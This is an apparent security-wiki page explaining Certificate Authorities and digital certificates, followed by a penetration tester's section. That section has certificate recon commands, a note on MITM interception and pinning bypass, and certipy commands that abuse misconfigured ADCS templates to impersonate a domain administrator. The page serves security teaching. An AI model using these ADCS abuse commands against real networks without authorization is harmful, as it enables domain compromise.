# Certificate Authority (CA)
## What is a Certificate Authority (CA)?

A Certificate Authority, often abbreviated as CA, is like a trusted digital notary. Its main job is to verify the identity of entities on the internet, such as websites and individuals. It plays a crucial role in ensuring the security and authenticity of online communication.

## How does a Certificate Authority work?

Imagine you're sending a sensitive email or accessing your bank's website. When your device connects to a secure website, like one that starts with "https://" instead of "http://", there's a need for a way to ensure that the website is indeed what it claims to be and that the data you exchange is encrypted and secure.

This is where the Certificate Authority comes in. It issues digital certificates, which are like electronic passports for websites. These certificates contain information about the website's identity, such as its name and public key.

## Key Components of a Digital Certificate:

- Public Key: This is a part of a pair of cryptographic keys used for encryption and decryption. The public key is included in the digital certificate and is shared openly.

- Private Key: The counterpart to the public key, the private key is kept secret and should only be known to the owner of the digital certificate.

- Digital Signature: The digital certificate is signed by the Certificate Authority using its own private key. This signature ensures that the certificate has not been tampered with and can be trusted.

## Why Trust a Certificate Authority?

Trusting a Certificate Authority is crucial for the security of online communication. Web browsers and operating systems come pre-installed with a list of trusted CAs. When your device connects to a secure website, it checks if the digital certificate presented by the website is signed by a trusted CA. If it is, the connection is established; if not, your browser will likely warn you about a potential security risk.

## Common Certificate Authorities:

There are several well-known CAs like Let's Encrypt, DigiCert, and Comodo. These organizations follow strict security practices to ensure the integrity of the certificates they issue.

In summary, a Certificate Authority is a digital guardian that helps verify the identities of entities on the internet, securing your online activities by ensuring that the websites you visit are who they claim to be and that your data is transmitted securely.

---

## CAs from a pentester's view

Certificates and CAs come up in two contexts: assessing a target's certs and abusing CA/certificate trust to attack.

### Inspecting certificates

```bash
# Pull and read a server certificate
openssl s_client -connect target.com:443 -servername target.com < /dev/null 2>/dev/null | openssl x509 -noout -text

# Certificate Transparency logs are a recon goldmine (finds subdomains)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Certificate-related findings

- **Self-signed / untrusted CA** — no real identity assurance; enables MITM.
- **Expired or wrong-hostname certs** — trust warnings users are trained to click through.
- **Weak signature (SHA-1)** or small key — forgeable.
- **Wildcard/private keys leaked** — anyone with the key can impersonate the site.

### Interception via your own CA

Burp/ZAP work by acting as a CA: you install their root cert on the client so they can sign certs on the fly and decrypt HTTPS. If a client validates the chain strictly or pins certs, you must bypass pinning.

### AD Certificate Services (ADCS) — a hot enterprise target

In Windows environments, a misconfigured internal CA (ADCS) can lead straight to domain admin (ESC1–ESC8 techniques):

```bash
# Enumerate vulnerable certificate templates
certipy find -u user@domain -p 'Password' -dc-ip 10.0.0.1 -vulnerable
# Abuse a misconfigured template to impersonate an admin
certipy req -u user@domain -p 'Password' -ca CA-NAME -template VulnTemplate -upn administrator@domain
```

## Related

- [PKI](Public%20Key%20Infrastructure%20(PKI).md) · [SSL Handshake](SSL%20Handshake.md)
- [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
